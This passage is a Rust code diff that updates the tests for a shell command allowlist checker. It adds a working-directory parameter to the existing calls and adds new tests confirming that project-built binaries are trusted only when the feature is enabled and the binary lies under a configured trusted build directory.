     let list = allow(&["find", "tr"]);
     let cmd = "find target/quarkus-app/lib -name \"*.jar\" | tr '\\n' ':'";
-    let result = check_all_segments(cmd, &list);
+    let result = check_all_segments(cmd, &list, ".");
     assert!(
         result.is_ok(),
         "path segment 'lib' in find args must not be treated as a command: {result:?}"
@@ -1219,7 +1221,7 @@ fn gh760_find_with_lib_path_segment_not_blocked() {
 fn gh760_find_with_deeply_nested_path_not_blocked() {
     let list = allow(&["find", "wc"]);
     let cmd = "find /usr/local/lib/python3/dist-packages -name '*.py' | wc -l";
-    let result = check_all_segments(cmd, &list);
+    let result = check_all_segments(cmd, &list, ".");
     assert!(
         result.is_ok(),
         "path arguments must not be scanned for command names: {result:?}"
@@ -1290,7 +1292,7 @@ fn gh760_pipeline_with_non_allowed_sink_fails() {
 fn compound_block_includes_segment_position() {
     let _lock = crate::core::data_dir::test_env_lock();
     crate::test_env::set_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE", "cp,git,go");
-    let result = super::enforce_shell_allowlist("cp a b && git stash && go build && ./cbc_old");
+    let result = super::enforce_shell_allowlist("cp a b && git stash && go build && ./cbc_old", ".");
     crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");
     let err = result.unwrap_err().to_string();
     assert!(
@@ -1308,11 +1310,127 @@ fn compound_block_includes_segment_position() {
 fn single_command_block_omits_pipeline_advisory() {
     let _lock = crate::core::data_dir::test_env_lock();
     crate::test_env::set_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE", "git");
-    let result = super::enforce_shell_allowlist("./cbc_old --help");
+    let result = super::enforce_shell_allowlist("./cbc_old --help", ".");
     crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");
     let err = result.unwrap_err().to_string();
     assert!(
         !err.contains("segment"),
         "single command must not show pipeline info: {err}"
+    );
+}
+
+// --- #813: trust_project_binaries auto-allows project-built executables ---
+
+#[test]
+fn trust_project_binaries_bare_name_never_trusted() {
+    // No `/` in the token → always requires the allowlist, even with the
+    // config on, since resolving a PATH-searched bare name against the
+    // project root would be meaningless.
+    assert!(!is_trusted_project_binary("cbc_old", "."));
+}
+
+#[test]
+fn trust_project_binaries_disabled_by_default() {
+    let _lock = crate::core::data_dir::test_env_lock();
+    let tmp = std::env::temp_dir().join(format!("lean-ctx-813-off-{}", std::process::id()));
+    std::fs::create_dir_all(&tmp).unwrap();
+    std::fs::write(tmp.join("cbc_old"), b"binary").unwrap();
+
+    // No config.toml at all → trust_project_binaries defaults to false.
+    crate::test_env::set_var("LEAN_CTX_CONFIG_DIR", tmp.to_str().unwrap());
+    let trusted = is_trusted_project_binary("./cbc_old", tmp.to_str().unwrap());
+    crate::test_env::remove_var("LEAN_CTX_CONFIG_DIR");
+    std::fs::remove_dir_all(&tmp).ok();
+
+    assert!(!trusted, "trust_project_binaries must default to off");
+}
+
+#[test]
+fn trust_project_binaries_allows_relative_path_under_trusted_build_dir() {
+    let _lock = crate::core::data_dir::test_env_lock();
+    let tmp = std::env::temp_dir().join(format!("lean-ctx-813-on-{}", std::process::id()));
+    std::fs::create_dir_all(&tmp).unwrap();
+    std::fs::write(tmp.join("cbc_old"), b"binary").unwrap();
+    std::fs::write(
+        tmp.join("config.toml"),
+        format!(
+            "trust_project_binaries = true\ntrusted_build_dirs = [\"{}\"]\n",
+            tmp.display()
+        ),
+    )
+    .unwrap();
+
+    crate::test_env::set_var("LEAN_CTX_CONFIG_DIR", tmp.to_str().unwrap());
+    let trusted = is_trusted_project_binary("./cbc_old", tmp.to_str().unwrap());
+    let untrusted_bare = is_trusted_project_binary("cbc_old", tmp.to_str().unwrap());
+    crate::test_env::remove_var("LEAN_CTX_CONFIG_DIR");
+    std::fs::remove_dir_all(&tmp).ok();
+
+    assert!(
+        trusted,
+        "relative path under a trusted_build_dirs entry must be trusted"
+    );
+    assert!(
+        !untrusted_bare,
+        "a bare command name must still require the allowlist"
+    );
+}
+
+#[test]
+fn trust_project_binaries_rejects_path_outside_trusted_dirs() {
+    let _lock = crate::core::data_dir::test_env_lock();
+    let trusted_dir =
+        std::env::temp_dir().join(format!("lean-ctx-813-trusted-{}", std::process::id()));
+    let other_dir =
+        std::env::temp_dir().join(format!("lean-ctx-813-other-{}", std::process::id()));
+    std::fs::create_dir_all(&trusted_dir).unwrap();
+    std::fs::create_dir_all(&other_dir).unwrap();
+    std::fs::write(other_dir.join("evil"), b"binary").unwrap();
+    std::fs::write(
+        trusted_dir.join("config.toml"),
+        format!(
+            "trust_project_binaries = true\ntrusted_build_dirs = [\"{}\"]\n",
+            trusted_dir.display()
+        ),
+    )
+    .unwrap();
+
+    crate::test_env::set_var("LEAN_CTX_CONFIG_DIR", trusted_dir.to_str().unwrap());
+    let trusted = is_trusted_project_binary("./evil", other_dir.to_str().unwrap());
+    crate::test_env::remove_var("LEAN_CTX_CONFIG_DIR");
+    std::fs::remove_dir_all(&trusted_dir).ok();
+    std::fs::remove_dir_all(&other_dir).ok();
+
+    assert!(
+        !trusted,
+        "a binary outside every trusted_build_dirs entry must not be trusted"
+    );
+}
+
+#[test]
+fn check_all_segments_allows_trusted_binary_not_in_allowlist() {
+    let _lock = crate::core::data_dir::test_env_lock();
+    let tmp = std::env::temp_dir().join(format!("lean-ctx-813-e2e-{}", std::process::id()));
+    std::fs::create_dir_all(&tmp).unwrap();
+    std::fs::write(tmp.join("cbc_old"), b"binary").unwrap();
+    std::fs::write(
+        tmp.join("config.toml"),
+        format!(
+            "trust_project_binaries = true\ntrusted_build_dirs = [\"{}\"]\n",
+            tmp.display()
+        ),
+    )
+    .unwrap();
+
+    crate::test_env::set_var("LEAN_CTX_CONFIG_DIR", tmp.to_str().unwrap());
+    let list = allow(&["git"]);
+    let result = check_all_segments("./cbc_old --help", &list, tmp.to_str().unwrap());
+    crate::test_env::remove_var("LEAN_CTX_CONFIG_DIR");
+    std::fs::remove_dir_all(&tmp).ok();
+
+    assert!(
+        result.is_ok(),
+        "trusted project binary must pass check_all_segments even when absent from \
+         shell_allowlist: {result:?}"
     );
 }
